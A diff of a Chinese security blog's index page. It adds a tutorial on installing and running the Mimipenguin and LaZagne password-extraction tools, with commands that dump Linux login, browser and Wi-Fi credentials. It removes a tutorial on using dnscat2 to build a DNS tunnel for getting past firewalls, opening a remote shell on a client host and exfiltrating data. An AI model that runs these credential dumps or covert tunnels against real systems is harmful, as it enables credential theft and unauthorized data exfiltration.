@@ -258,6 +258,193 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/07/两款密码提取工具的配置和使用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2019/12/07/两款密码提取工具的配置和使用/" itemprop="url">
+                  两款密码提取工具的配置和使用
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-07T11:59:46+08:00">
+                2019-12-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/windows/" itemprop="url" rel="index">
+                    <span itemprop="name">windows</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/12/07/两款密码提取工具的配置和使用/" class="leancloud_visitors" data-flag-title="两款密码提取工具的配置和使用">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="linux密码提取工具Mimipenguin配置及其使用"><a href="#linux密码提取工具Mimipenguin配置及其使用" class="headerlink" title="linux密码提取工具Mimipenguin配置及其使用"></a>linux密码提取工具Mimipenguin配置及其使用</h2><h3 id="Mimipenguin"><a href="#Mimipenguin" class="headerlink" title="Mimipenguin"></a>Mimipenguin</h3><p>Mimipenguin从Linux内存中提取登录密码的工具。改编自流行的Windows工具mimikatz。</p>
+<h3 id="安装Mimipenguin"><a href="#安装Mimipenguin" class="headerlink" title="安装Mimipenguin"></a>安装Mimipenguin</h3><p>首先从github上克隆Mimipenguin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/huntergregal/mimipenguin</span><br></pre></td></tr></table></figure></p>
+<p>然后安装Mimipenguin的依赖GLIBC_2.14，而GLIBC_2.14我们需要源码编译安装，所以需要安装gcc</p>
+<p>根据不同系统选择不同的安装命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install gcc</span><br><span class="line">yum install gcc</span><br></pre></td></tr></table></figure></p>
+<p>完成之后，我们先创建一个路径存放下载的源码，然后下载GLIBC_2.14的源码进行编译安装并链接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir /home/tar</span><br><span class="line">cd /home/tar</span><br><span class="line">wget https://ftp.gnu.org/gnu/glibc/glibc-2.14.tar.gz</span><br><span class="line">tar -zxvf glibc-2.14.tar.gz</span><br><span class="line">cd glibc-2.14</span><br><span class="line">mkdir build</span><br><span class="line">cd build</span><br><span class="line">../configure --prefix=/usr/local/glibc-2.14</span><br><span class="line">make -j8</span><br><span class="line">make install</span><br><span class="line">export LD_LIBRARY_PATH=LD_LIBRARY_PATH:/home/tar/glibc-2.14/build/</span><br></pre></td></tr></table></figure></p>
+<p>然后进入mimipenguin目录，运行mimipenguin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mimipenguin</span><br></pre></td></tr></table></figure></p>
+<h2 id="密码提取工具LaZagne"><a href="#密码提取工具LaZagne" class="headerlink" title="密码提取工具LaZagne"></a>密码提取工具LaZagne</h2><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><p>LaZagne是一款可以在windows、linux、mac中提取密码的工具，包括各类浏览器中保存的密码，本地保存的私钥文件，windows的登陆密码，记住的wifi密码等。每个环境中的安装使用操作都比较相似，本部分以windows为例介绍一下安装运行过程。</p>
+<h3 id="安装LaZagne"><a href="#安装LaZagne" class="headerlink" title="安装LaZagne"></a>安装LaZagne</h3><p>LaZagne需要python环境才可以运行，所以要提前准备python环境，并将pip更新到最新版本。</p>
+<p>在windows本地任意文件夹内下载LaZagne源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/AlessandroZ/LaZagne.git</span><br></pre></td></tr></table></figure>
+<p>requirements.txt中说明了运行LaZagne需要哪些依赖,requirements.txt:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enum34; python_version &lt; &apos;3.4&apos; and sys_platform == &apos;win32&apos;</span><br><span class="line">psutil; sys_platform == &apos;linux&apos; or sys_platform == &apos;linux2&apos;</span><br><span class="line">pyasn1</span><br><span class="line">rsa; sys_platform == &apos;win32&apos;</span><br><span class="line">secretstorage; sys_platform == &apos;linux&apos; or sys_platform == &apos;linux2&apos;</span><br><span class="line">https://github.com/AlessandroZ/pypykatz/archive/master.zip; sys_platform == &apos;win32&apos;  # should point to pypykatz if my PR is approved</span><br></pre></td></tr></table></figure></p>
+<p>在命令行中运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install r requirements.txt</span><br></pre></td></tr></table></figure></p>
+<p>接着进入Windows目录(如果是其他系统就使用对应目录脚本)，根据需要获取的密码范围运行laZagne.py来获取密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#运行所有模块</span><br><span class="line">python laZagne.py all</span><br><span class="line">#仅从浏览器获取密码</span><br><span class="line">python laZange.py browsers</span><br><span class="line">#仅从火狐浏览器获取密码</span><br><span class="line">python laZagne.py browsers -firefox</span><br></pre></td></tr></table></figure></p>
+<p>如果运行laZagne.py中报错缺少依赖，就根据报错信息pip安装所需依赖直到可以运行。</p>
+<p>运行结果部分截图</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/password_get/password01.png" alt=""></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/02/samba安装与配置/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2279,224 +2466,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/07/利用DNS-Tunnel传输数据/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/08/07/利用DNS-Tunnel传输数据/" itemprop="url">
-                  利用DNS Tunnel传输数据
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-07T10:37:51+08:00">
-                2018-08-07
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/08/07/利用DNS-Tunnel传输数据/" class="leancloud_visitors" data-flag-title="利用DNS Tunnel传输数据">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>当一些服务器被黑客非法入侵之后，黑客都是以从入侵中获益作为目标，而最大的获益方式就是偷取高价值的数据，所以大部分公司也会为了高价值的数据保护设下层层防火墙以及加密，让核心资产偷不走、解不开、用不了。</p>
-<p>其中“偷不走”这步，一般都是对出站的流量做很严格的限制，并且加上很多的报警规则，这样即使入侵进去，也很难建立一个通道将核心资产偷走。</p>
-<p>但是防御这件事情，不能因噎废食，服务器不能因为有潜在的风险就把所有的通道都限制掉，就比如服务器需要允许至少对一个服务器的DNS请求，在这个前提下，就有大牛想出通过DNS Tunnel外发数据，避过防火墙来外发数据。</p>
-<h2 id="0x01-DNS"><a href="#0x01-DNS" class="headerlink" title="0x01 DNS"></a>0x01 DNS</h2><p>DNS（Domain Name System，域名系统），万维网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过域名，最终得到该域名对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。</p>
-<h2 id="0x02-DNS-Tunnel"><a href="#0x02-DNS-Tunnel" class="headerlink" title="0x02 DNS Tunnel"></a>0x02 DNS Tunnel</h2><p>DNS Tunnel，是隐蔽信道的一种，通过将其他协议封装在DNS协议中传输建立通信。</p>
-<p>DNS Tunnel可以分为直连和中继两种。</p>
-<p>直连也就是用目标服务器直接和指定的目标DNS Server(Authoritative NS Server)连接，通过将数据编码封装在DNS协议中进行通信，这种方式速度快，但是隐蔽性比较弱，很容易被探测到，另外限制比较高，很多场景不允许自己指定DNS Server。</p>
-<p>中继是通过DNS迭代查询而实现的中继隧道，则更为隐秘，但同时因为数据包到达目标DNS Server前需要经过多个节点，所以速度上较直连慢很多。</p>
-<p>中继过程中的一个关键点是对DNS缓存机制的规避，因为如果需要解析的域名在Local DNS Server中已经有缓存时，Local DNS Server就不会转发数据包。所以在我们构造的请求中，每次查询的域名都是不一样的或者是已经是过期的。</p>
-<p>对DNS载荷的编码是DNS Tunnel的另一个核心技术。从高层来看，载荷只是客户端和服务器通信的正常流量。例如客户端发送一个A记录请求给服务器，查询的主机名为 2roAUwBaCGRuc3R1bm5lbGluZwo.test.domain.com,其中2roAUwBaCGRuc3R1bm5lbGluZwo则是客户端传递给服务器的信息，这串字符解码后的信息便是dns tunnel。</p>
-<p>大多数场景下，内网的Client位于防火墙后，Server不可能发起连接。所以Client会定时向Server发送请求，保证二者之间的通信状态。</p>
-<h2 id="0x03-使用dnscat2工具实现"><a href="#0x03-使用dnscat2工具实现" class="headerlink" title="0x03 使用dnscat2工具实现"></a>0x03 使用dnscat2工具实现</h2><p>Dnscat2的定位是一个封装在DNS协议中加密的命令与控制(C&amp;C)信道。它同样是C/S架构，Client由c编写，server由ruby编写。Client位于感染主机，而Server位于权威域名服务器上，如果没有权威域名服务器，则可以采用直连模式。</p>
-<p>为了直接达到能拿出来用的效果，我就使用实际场景搭建了，应用于实际场景我们需要一台公网服务器、一个域名、还有dnscat2程序。</p>
-<p>公网服务器作为server端，我建议使用ubuntu或者高版本centos（低版本的centos会出现一些小问题，如果比较熟悉ruby和gem挺容易解决的，我这里使用ubuntu演示，没有太多经验的可以跟着我使用ubuntu来现尝试一下）</p>
-<p>server使用如下代码安装需要的环境，然后使用git下载dnscat2进行安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get install ruby ruby-dev git make g++ rubygems</span><br><span class="line">gem update --system</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure></p>
-<p>出现几行绿色字体如下所示就代表安装完成了：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns01.png?raw=true" alt=""></p>
-<p>然后我们需要在域名解析服务器上这样伪造，设置一个NS记录指向自己的子域名，再设置一个A记录指向自己部署server端的服务器地址。如下图的设置，打码部分是服务器ip地址。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns02.png?raw=true" alt=""></p>
-<p>client如果是linux，就使用git下载dnscat2源码，然后编译dnscat2/client文件夹中的c文件</p>
-<p>linux-client端部署代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/client/</span><br><span class="line">make</span><br></pre></td></tr></table></figure></p>
-<p>client如果是windows，就直接在这个网址（<a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a> ）下载win32.zip的dnascat2后解压就可以了</p>
-<p>至此，环境都部署完毕，就可以开始连接隧道了。我测试时使用ubuntu系统的公网服务器做server，用本机的kali做client。</p>
-<p>我们首先在server端开启隧道：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb dns.uuzdaisuki.com --no-cache</span><br></pre></td></tr></table></figure></p>
-<p>将这个域名改成自己刚刚设置的ns记录的子域名，–no-cache代表不进行缓存</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns03.png?raw=true" alt=""></p>
-<p>然后将上面产生的这串secret复制下来，要在client中使用。</p>
-<p>client中运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./dnscat --dns domain=dns.uuzdaisuki.com --secret=xxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns04.png?raw=true" alt=""></p>
-<p>domain参数是我们ns记录的子域名，secret参数是刚才server中生成的密文，我们传输信息的安全程度就取决于它。windows中参数使用略有不同，自己查看help文件即可。</p>
-<p>client运行得到上面结果之后，server中也会出现一个new window create，后面是它的sessionID，我们现在就可以在server中通过这个session连接控制client了</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns05.png?raw=true" alt=""></p>
-<p>使用如下代码可以进去这个session<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session -i 1</span><br></pre></td></tr></table></figure></p>
-<p>然后使用help可以查看可以使用的命令：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns06.png?raw=true" alt=""></p>
-<p>比如我们要使用一个shell控制，可以输入shell获取一个新的window，sessionID为2，然后再session -i 2切入。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns07.png?raw=true" alt=""></p>
-<p>之后就可以使用命令交互：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns08.png?raw=true" alt=""></p>
-<p>此时我们也可以通过dns隧道来访问目标系统可以访问的网络，类似于ssl，在dnscat2中用listen命令实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen [lhost:]lport rhost:rport</span><br></pre></td></tr></table></figure></p>
-<p>比如我们要通过对方网络访问百度，那就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">listen 1234 www.baidu.com:80</span><br></pre></td></tr></table></figure></p>
-<p>访问localhost:1234就可以通过对方网络访问百度了，不过这个功能一般是用来访问内网才可以访问的网站，探测对方内网之后将baidu替换成对方内网的站就可以了。</p>
-<p>我们dns tunnel建立好之后，主要是为了绕过防火墙偷数据，使用help学习其他功能传输即可。</p>
-<h3 id="抓包观察"><a href="#抓包观察" class="headerlink" title="抓包观察"></a>抓包观察</h3><p><img src="https://github.com/echohun/blog_image/blob/master/dns_tunnel/dns09.png?raw=true" alt=""></p>
-<p>在客户端中抓包可以看到，有很多DNS的TXT、CNAME、MX的查询方法，这是因为Dnscat2 利用的DNS请求类型默认是TXT,CNAME,MX随机混合使用，不过我们可以在运行时通过参数自定义来更改请求方式。</p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>用于dns tunnel的工具除了dnscat2(灵活)，还有dns2tcp(Kali直接集成了这个工具)、iodine(速度快)等，各有特点，我们可以根据实际情况来选取。</p>
-<p>还有要注意的一点是使用了dns tunnel只是绕过了一些传统防火墙，如果对方的防御系统具备一些基于机器学习或深度学习的检测策略，或者对方的安全人员比较熟悉这种偷数据的方式，还是会被发现的。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2546,7 +2515,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">99</span>
+                <span class="site-state-item-count">100</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
